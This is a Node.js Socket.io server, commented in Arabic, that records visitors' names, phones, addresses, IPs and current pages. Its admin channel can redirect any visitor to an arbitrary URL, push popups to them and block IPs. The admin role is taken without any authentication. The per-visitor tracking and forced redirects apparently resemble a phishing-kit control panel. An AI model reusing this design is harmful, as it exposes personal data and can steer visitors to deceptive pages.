// استيراد الحزم الأساسية
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();

// تفعيل CORS
app.use(cors({
    origin: "*",
    methods: ["GET", "POST"]
}));
app.use(express.json());

const server = http.createServer(app);

// إعداد Socket.io
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// ====== نظام حظر الـ IP ======
const BLOCKED_FILE = path.join(__dirname, 'blocked_ips.json');
let blockedIPs = new Set();

// تحميل قائمة المحظورين من الملف عند تشغيل السيرفر
try {
    if (fs.existsSync(BLOCKED_FILE)) {
        const raw = fs.readFileSync(BLOCKED_FILE, 'utf-8');
        const arr = JSON.parse(raw);
        if (Array.isArray(arr)) blockedIPs = new Set(arr);
        console.log(`🛡️ تم تحميل ${blockedIPs.size} IP محظور`);
    }
} catch (e) {
    console.warn('⚠️ فشل تحميل ملف المحظورين:', e.message);
}

function saveBlockedIPs() {
    try {
        fs.writeFileSync(BLOCKED_FILE, JSON.stringify([...blockedIPs], null, 2));
    } catch (e) {
        console.warn('⚠️ فشل حفظ ملف المحظورين:', e.message);
    }
}

// استخراج IP الحقيقي للزائر
function getClientIp(req) {
    const fwd = req.headers['x-forwarded-for'];
    if (fwd) return fwd.split(',')[0].trim();
    return req.socket.remoteAddress || '';
}

// ====== Endpoint يفحصه الموقع الرئيسي عند كل تحميل ======
app.get('/check-block', (req, res) => {
    const ip = getClientIp(req);
    res.set('Cache-Control', 'no-store');
    res.json({ ip, blocked: blockedIPs.has(ip) });
});

// (اختياري) endpoint بسيط للتأكد ان السيرفر شغال
app.get('/', (req, res) => {
    res.send('Server is running ✅');
});

// تخزين المستخدمين النشطين
let activeUsers = {};

// حظر الاتصالات القادمة من IP محظور على مستوى socket
io.use((socket, next) => {
    const fwd = socket.handshake.headers['x-forwarded-for'];
    const ip = fwd ? fwd.split(',')[0].trim() : socket.handshake.address;
    if (blockedIPs.has(ip)) {
        console.log(`⛔ اتصال مرفوض من IP محظور: ${ip}`);
        return next(new Error('blocked'));
    }
    socket.data.ip = ip;
    next();
});

io.on('connection', (socket) => {
    console.log(`📡 متصل جديد: ${socket.id} - IP: ${socket.data.ip}`);

    // 1. تسجيل مستخدم من الموقع الرئيسي
    socket.on('register_user', (data) => {
        const userId = data.userId || socket.id;

        activeUsers[socket.id] = {
            socketId: socket.id,
            userId: userId,
            name: data.name || '',
            phone: data.phone || '',
            address: data.address || '',
            ip: socket.data.ip,
            currentPage: data.currentPage || 'صفحة التحميل',
            connectedAt: new Date()
        };

        console.log(`👤 مستخدم: ${userId} في: ${activeUsers[socket.id].currentPage}`);
        sendActiveUsersToAdmins();
    });

    // 2. تسجيل الادمن
    socket.on('register_admin', () => {
        socket.join('admins_room');
        console.log(`👑 أدمن متصل: ${socket.id}`);
        socket.emit('update_users_list', Object.values(activeUsers));
        socket.emit('update_blocked_list', [...blockedIPs]);
    });

    // 3. أمر التوجيه من الادمن للمستخدم
    socket.on('admin_redirect_user', (data) => {
        const { targetSocketId, redirectUrl } = data;
        if (targetSocketId && redirectUrl) {
            console.log(`🔄 توجيه [${targetSocketId}] إلى: [${redirectUrl}]`);
            io.to(targetSocketId).emit('execute_redirect', { url: redirectUrl });
        }
    });

    // 4. إرسال رسالة/popup من الادمن للمستخدم
    socket.on('admin_send_popup', (data) => {
        const { targetSocketId, title, message, type } = data;
        if (targetSocketId) {
            io.to(targetSocketId).emit('show_popup', {
                title: title || 'تنبيه',
                message: message || '',
                type: type || 'info'
            });
        }
    });

    // 5. حظر IP معين
    socket.on('admin_block_ip', (data) => {
        const ip = (data && data.ip) ? String(data.ip).trim() : '';
        if (!ip) return;

        blockedIPs.add(ip);
        saveBlockedIPs();
        console.log(`⛔ تم حظر IP: ${ip}`);

        // فصل كل الاتصالات الحالية لنفس الـ IP
        for (const [sid, u] of Object.entries(activeUsers)) {
            if (u.ip === ip) {
                const s = io.sockets.sockets.get(sid);
                if (s) {
                    s.emit('you_are_blocked');
                    s.disconnect(true);
                }
                delete activeUsers[sid];
            }
        }

        io.to('admins_room').emit('update_blocked_list', [...blockedIPs]);
        sendActiveUsersToAdmins();
    });

    // 6. فك الحظر
    socket.on('admin_unblock_ip', (data) => {
        const ip = (data && data.ip) ? String(data.ip).trim() : '';
        if (!ip) return;
        blockedIPs.delete(ip);
        saveBlockedIPs();
        console.log(`✅ تم فك حظر IP: ${ip}`);
        io.to('admins_room').emit('update_blocked_list', [...blockedIPs]);
    });

    // 7. الخروج
    socket.on('disconnect', () => {
        if (activeUsers[socket.id]) {
            console.log(`❌ خرج: ${activeUsers[socket.id].userId}`);
            delete activeUsers[socket.id];
            sendActiveUsersToAdmins();
        }
    });
});

function sendActiveUsersToAdmins() {
    io.to('admins_room').emit('update_users_list', Object.values(activeUsers));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على المنفذ: ${PORT}`);
});
